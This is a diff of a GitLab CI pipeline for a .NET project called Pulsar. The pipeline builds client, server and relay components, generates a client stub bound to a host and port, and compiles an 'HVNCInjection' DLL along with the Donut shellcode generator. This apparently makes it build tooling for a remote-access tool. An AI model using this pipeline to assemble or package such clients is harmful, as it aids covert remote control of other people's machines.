@@ -1,143 +1,227 @@
 stages:
-  - determine
-  - build
+  - managed
+  - tests
+  - smokes
+  - native
+  - package
 
-variables:
-  SOLUTION_FILE: "Pulsar.sln"
-  BUILD_CONFIGURATION: "Release"
-  SERVER_TARGET_FRAMEWORK: "net9.0-windows"
-  SERVER_RUNTIME: "win-x64"
-  CLIENT_TARGET_FRAMEWORK: "net48"
-
-# Only run on main branch when C# files or project files change
 workflow:
   rules:
-    - if: $CI_COMMIT_BRANCH == "main"
-      changes:
-        - "**/*.cs"
-        - "**/*.csproj"
-        - "**/*.sln"
-        - ".gitlab-ci.yml"
+    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
+    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'
+    - if: '$CI_PIPELINE_SOURCE == "web"'
+    - if: '$CI_PIPELINE_SOURCE == "schedule"'
+    - when: never
 
-determine-version:
-  stage: determine
-  image: ubuntu:22.04
+default:
   tags:
-    - docker
-  before_script:
-    - apt-get update -qq && apt-get install -y -qq git grep
+    - windows
+  interruptible: true
+  variables:
+    DOTNET_NOLOGO: "true"
+    DOTNET_CLI_TELEMETRY_OPTOUT: "true"
+    DOTNET_SKIP_FIRST_TIME_EXPERIENCE: "true"
+    DOTNET_ROLL_FORWARD: "Major"
+
+managed-builds:
+  stage: managed
+  parallel:
+    matrix:
+      - COMPONENT: common
+        PROJECT: Pulsar.Common/Pulsar.Common.csproj
+      - COMPONENT: client
+        PROJECT: Pulsar.Client/Pulsar.Client.csproj
+      - COMPONENT: server
+        PROJECT: Pulsar.Server/Pulsar.Server.csproj
+      - COMPONENT: admin
+        PROJECT: Pulsar.AdminClient/Pulsar.AdminClient.csproj
+      - COMPONENT: relay
+        PROJECT: Pulsar.Relay/Pulsar.Relay.csproj
+  script:
+    - dotnet restore "$env:PROJECT"
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+    - dotnet build "$env:PROJECT" --configuration Release --no-restore
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+tests:
+  stage: tests
+  needs:
+    - managed-builds
+  parallel:
+    matrix:
+      - FRAMEWORK: net48
+        EXPECTED: "54"
+      - FRAMEWORK: net9.0-windows
+        EXPECTED: "62"
+  script:
+    - dotnet restore Pulsar.Common.Tests/Pulsar.Common.Tests.csproj
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+    - dotnet test Pulsar.Common.Tests/Pulsar.Common.Tests.csproj --configuration Release --framework "$env:FRAMEWORK" --no-restore --results-directory TestResults --logger "trx;LogFileName=$($env:FRAMEWORK).trx"
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+    - |
+      $path = Join-Path $PWD "TestResults/$($env:FRAMEWORK).trx"
+      if (-not (Test-Path $path)) { throw "Missing test result: $path" }
+      [xml] $trx = Get-Content -Raw $path
+      $total = [int] $trx.TestRun.ResultSummary.Counters.total
+      $passed = [int] $trx.TestRun.ResultSummary.Counters.passed
+      $expected = [int] $env:EXPECTED
+      if ($total -ne $expected -or $passed -ne $total) {
+        throw "Expected $expected passing $($env:FRAMEWORK) tests; observed $passed/$total."
+      }
+  artifacts:
+    when: always
+    paths:
+      - TestResults
+    expire_in: 30 days
+
+contract-checks:
+  stage: tests
+  needs:
+    - managed-builds
+  script:
+    - dotnet test Pulsar.Common.Tests/Pulsar.Common.Tests.csproj --configuration Release --framework net9.0-windows --filter "FullyQualifiedName~Pulsar.Common.Tests.Build.BuilderCompatibilityTests|FullyQualifiedName~Pulsar.Common.Tests.Messages.MessageHandlerTests" --results-directory TestResults --logger "trx;LogFileName=contracts.trx"
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+    - |
+      [xml] $trx = Get-Content -Raw 'TestResults/contracts.trx'
+      $counters = $trx.TestRun.ResultSummary.Counters
+      if ([int] $counters.total -ne 18 -or [int] $counters.passed -ne 18) {
+        throw "Expected 18 passing contract tests; observed $($counters.passed)/$($counters.total)."
+      }
+    - |
+      $ErrorActionPreference = 'Stop'
+      $work = Join-Path $PWD 'ci-builder'
+      New-Item -ItemType Directory -Force $work | Out-Null
+      $certPath = Join-Path $work 'ci-builder.pfx'
+      $cert = New-SelfSignedCertificate `
+        -Subject 'CN=Pulsar CI Builder' `
+        -CertStoreLocation 'Cert:\CurrentUser\My' `
+        -KeyAlgorithm RSA `
+        -KeyLength 2048 `
+        -KeyExportPolicy Exportable `
+        -KeySpec Signature `
+        -NotAfter (Get-Date).AddDays(1)
+      try {
+        Export-PfxCertificate `
+          -Cert $cert `
+          -FilePath $certPath `
+          -Password ([System.Security.SecureString]::new()) | Out-Null
+      }
+      finally {
+        Remove-Item "Cert:\CurrentUser\My\$($cert.Thumbprint)" -ErrorAction SilentlyContinue
+      }
+
+      dotnet build Pulsar.Client/Pulsar.Client.csproj --configuration Release
+      if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+      $output = Join-Path $work 'client.exe'
+      dotnet run `
+        --project tools/stub-builder/StubBuilder.csproj `
+        --configuration Release `
+        -- `
+        -hosts '127.0.0.1:4783' `
+        -out $output `
+        -cert $certPath `
+        -template (Join-Path $PWD 'bin/Release/net9.0-windows/client.bin')
+      if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+      $manifestPath = "$output.manifest.json"
+      if (-not (Test-Path $manifestPath)) { throw "Builder did not emit $manifestPath." }
+      $manifest = Get-Content -Raw $manifestPath | ConvertFrom-Json
+      $protocol = ([regex]::Match(
+        (Get-Content -Raw 'Pulsar.Common/ProtocolVersion.cs'),
+        'Current\s*=\s*"([^"]+)"'
+      )).Groups[1].Value
+      $expectedHash = (Get-FileHash $output -Algorithm SHA256).Hash
+      if ($manifest.ProtocolVersion -ne $protocol) {
+        throw "Manifest protocol $($manifest.ProtocolVersion) does not match $protocol."
+      }
+      if ($manifest.OutputSha256 -ne $expectedHash) {
+        throw "Manifest output hash does not match the generated artifact."
+      }
+      if ($manifest.SettingsLayoutVersion -lt 1 -or [string]::IsNullOrWhiteSpace($manifest.EntryPoint)) {
+        throw "Manifest is missing settings-layout or entry-point metadata."
+      }
+  artifacts:
+    when: always
+    paths:
+      - TestResults
+    expire_in: 30 days
+
+web-api-smoke:
+  stage: smokes
+  needs:
+    - tests
+    - contract-checks
+  script:
+    - dotnet run --project tools/webapi-smoke/WebApiSmoke.csproj --configuration Release
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+admin-relay-smoke:
+  stage: smokes
+  needs:
+    - tests
+    - contract-checks
+  script:
+    - dotnet build Pulsar.AdminClient/Pulsar.AdminClient.csproj --configuration Debug
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+    - dotnet run --project tools/admin-relay-smoke/AdminRelaySmoke.csproj --configuration Debug
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+
+native-hvnc:
+  stage: native
+  needs:
+    - web-api-smoke
+    - admin-relay-smoke
   script:
     - |
-      if [ -f "Pulsar.Server/Properties/AssemblyInfo.cs" ]; then
-        VERSION=$(grep -oP '\[assembly: AssemblyVersion\("\K[0-9]+\.[0-9]+\.[0-9]+' Pulsar.Server/Properties/AssemblyInfo.cs || echo "unknown")
-        echo "Found version: $VERSION"
-        echo "VERSION=$VERSION" >> variables.env
-      else
-        echo "AssemblyInfo.cs not found"
-        echo "VERSION=unknown" >> variables.env
-      fi
+      $solutionDir = "$($PWD.Path)\"
+      msbuild HVNCInjection/HVNCInjection.vcxproj /m /p:Configuration=Release /p:Platform=x64 "/p:SolutionDir=$solutionDir"
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
     - |
-      if echo "$CI_COMMIT_MESSAGE" | grep -q "^STABLE"; then
-        echo "Stable release detected"
-        echo "IS_STABLE=true" >> variables.env
-        echo "RELEASE_TYPE=stable" >> variables.env
-      else
-        echo "Development build"
-        echo "IS_STABLE=false" >> variables.env
-        echo "RELEASE_TYPE=dev" >> variables.env
-      fi
-    - echo "Commit short SHA:" $CI_COMMIT_SHORT_SHA
-    - echo "Ref name:" $CI_COMMIT_REF_NAME
-    - echo "COMMIT_SHORT_SHA=$CI_COMMIT_SHORT_SHA" >> variables.env
-    - |
-      # Clean commit message for dotenv (remove problematic characters)
-      CLEAN_MESSAGE=$(echo "$CI_COMMIT_MESSAGE" | tr -d '\n\r' | sed 's/"/\\"/g' | sed "s/'/\\'/g")
-      echo "COMMIT_MESSAGE=$CLEAN_MESSAGE" >> variables.env
+      $artifact = 'bin/Release/net9.0-windows/HVNCInjection.x64.dll'
+      if (-not (Test-Path $artifact)) { throw "Missing HVNC artifact: $artifact" }
+  artifacts:
+    paths:
+      - bin/Release/net9.0-windows/HVNCInjection.x64.dll
+    expire_in: 30 days
 
-build:
-  stage: build
-  needs: ["determine-version"]
-  image: debian:12
-  tags:
-    - docker
-  before_script:
-    # Install Microsoft packages repository and .NET SDK 9.0
-    - apt-get update -qq
-    - apt-get install -y -qq wget ca-certificates apt-transport-https
-    - wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
-    - dpkg -i packages-microsoft-prod.deb
-    - rm packages-microsoft-prod.deb
-    - apt-get update -qq
-    - apt-get install -y -qq dotnet-sdk-9.0 zip
+native-donut:
+  stage: native
+  needs:
+    - web-api-smoke
+    - admin-relay-smoke
   script:
-    - set -e  # Exit on any error
-    - echo "Building Pulsar version:" $VERSION
-    - echo "Release type:" $RELEASE_TYPE
-    - echo "Commit:" $COMMIT_SHORT_SHA
-    - echo "Commit message:" $COMMIT_MESSAGE
-    - echo "Restoring dependencies..."
-    - dotnet restore $SOLUTION_FILE --runtime $SERVER_RUNTIME
-    - echo "Build completed. Checking if restore was successful..."
-    - echo "Building client..."
-    - dotnet build Pulsar.Client/Pulsar.Client.csproj --configuration $BUILD_CONFIGURATION --no-restore --framework $CLIENT_TARGET_FRAMEWORK
-    - echo "Client build completed. Checking build output..."
-    - ls -la Pulsar.Client/bin/Release/ 2>/dev/null || echo "Client bin directory not found"
-    - echo "Publishing server..."
-    - dotnet publish Pulsar.Server/Pulsar.Server.csproj --configuration $BUILD_CONFIGURATION --output "$CI_PROJECT_DIR/publish/server" --no-restore --framework $SERVER_TARGET_FRAMEWORK --runtime $SERVER_RUNTIME --self-contained false
-    - echo "Server publish completed. Checking publish output..."
-    - ls -la publish/server/ 2>/dev/null || echo "Server publish directory not found"
-    - echo "Preparing build output..."
-    - mkdir -p build_output
-    # Copy all published server code to build_output
-    - cp -r publish/server/* build_output/
-    # Find and copy client.bin - check multiple possible locations
+    - dotnet restore Pulsar.Server/Pulsar.Server.csproj
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+    - dotnet build Pulsar.Server/Pulsar.Server.csproj --configuration ReleaseWithDonut --no-restore
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
     - |
-      CLIENT_FOUND=false
-      # Check location 1: Pulsar.Client/bin/Release/net472/Pulsar.Client.exe
-      if [ -f "Pulsar.Client/bin/Release/$CLIENT_TARGET_FRAMEWORK/Pulsar.Client.exe" ]; then
-        cp "Pulsar.Client/bin/Release/$CLIENT_TARGET_FRAMEWORK/Pulsar.Client.exe" build_output/client.bin
-        echo "✓ Copied Pulsar.Client.exe as client.bin from Pulsar.Client/bin"
-        CLIENT_FOUND=true
-      # Check location 2: bin/Release/net472/Client.exe (like GitHub Actions)
-      elif [ -f "bin/Release/$CLIENT_TARGET_FRAMEWORK/Client.exe" ]; then
-        cp "bin/Release/$CLIENT_TARGET_FRAMEWORK/Client.exe" build_output/client.bin
-        echo "✓ Copied Client.exe from bin directory as client.bin"
-        CLIENT_FOUND=true
-      # Check location 3: bin/Release/net472/Pulsar.Client.exe
-      elif [ -f "bin/Release/$CLIENT_TARGET_FRAMEWORK/Pulsar.Client.exe" ]; then
-        cp "bin/Release/$CLIENT_TARGET_FRAMEWORK/Pulsar.Client.exe" build_output/client.bin
-        echo "✓ Copied Pulsar.Client.exe from bin directory as client.bin"
-        CLIENT_FOUND=true
-      # Check location 4: Pulsar.Client/bin/Release/net472/Client.exe
-      elif [ -f "Pulsar.Client/bin/Release/$CLIENT_TARGET_FRAMEWORK/Client.exe" ]; then
-        cp "Pulsar.Client/bin/Release/$CLIENT_TARGET_FRAMEWORK/Client.exe" build_output/client.bin
-        echo "✓ Copied Client.exe as client.bin from Pulsar.Client/bin"
-        CLIENT_FOUND=true
-      fi
-      
-      if [ "$CLIENT_FOUND" = false ]; then
-        echo "❌ ERROR: Client executable not found!"
-        echo "Searched locations:"
-        echo "  - Pulsar.Client/bin/Release/$CLIENT_TARGET_FRAMEWORK/Pulsar.Client.exe"
-        echo "  - bin/Release/$CLIENT_TARGET_FRAMEWORK/Client.exe"
-        echo "  - bin/Release/$CLIENT_TARGET_FRAMEWORK/Pulsar.Client.exe"
-        echo "  - Pulsar.Client/bin/Release/$CLIENT_TARGET_FRAMEWORK/Client.exe"
-        echo ""
-        echo "Available files in project directories:"
-        echo "Pulsar.Client/bin contents:"
-        find Pulsar.Client/bin -name "*.exe" 2>/dev/null || echo "No exe files found in Pulsar.Client/bin"
-        echo "bin contents:"
-        find bin -name "*.exe" 2>/dev/null || echo "No exe files found in bin"
-        echo ""
-        echo "All bin directories structure:"
-        find . -type d -name "bin" -exec echo "Directory: {}" \; -exec find {} -name "*.exe" \; 2>/dev/null || echo "No bin directories found"
-        exit 1
-      fi
-    # Create the final zip with just the essentials
-    - cd build_output && zip -r ../build_output.zip . && cd ..
-    - echo "✓ Build package created successfully"
-    - echo "Package contents:"
-    - unzip -l build_output.zip | head -20 || true
+      foreach ($artifact in @(
+        'external/donut/donut.exe',
+        'bin/Release/net9.0-windows/donut.exe'
+      )) {
+        if (-not (Test-Path $artifact)) { throw "Missing Donut artifact: $artifact" }
+      }
+  artifacts:
+    paths:
+      - bin/Release/net9.0-windows/donut.exe
+    expire_in: 30 days
+
+package:
+  stage: package
+  needs:
+    - job: native-hvnc
+      artifacts: true
+    - job: native-donut
+      artifacts: true
+  script:
+    - dotnet build Pulsar.Client/Pulsar.Client.csproj --configuration Release
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+    - dotnet build Pulsar.Server/Pulsar.Server.csproj --configuration Release
+    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
+    - |
+      $output = 'bin/Release/net9.0-windows'
+      if (-not (Test-Path $output)) { throw "Missing package output: $output" }
+      Compress-Archive -Path "$output/*" -DestinationPath build_output.zip -Force
   artifacts:
     paths:
       - build_output.zip
